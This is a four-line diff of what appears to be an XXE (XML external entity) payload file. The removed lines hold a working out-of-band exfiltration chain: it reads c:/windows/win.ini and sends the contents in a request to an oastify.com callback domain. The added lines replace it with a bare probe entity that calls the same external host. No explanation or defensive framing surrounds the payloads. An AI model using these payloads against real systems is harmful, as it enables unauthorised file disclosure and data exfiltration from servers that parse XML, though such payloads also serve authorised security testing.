@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.gj3o5jepmkph7vv2asfxrvprpivbj27r.oastify.com/'>">
-%eval;
-%exfil;
+<!ENTITY % test SYSTEM "http://test123.gj3o5jepmkph7vv2asfxrvprpivbj27r.oastify.com/">
+%test;
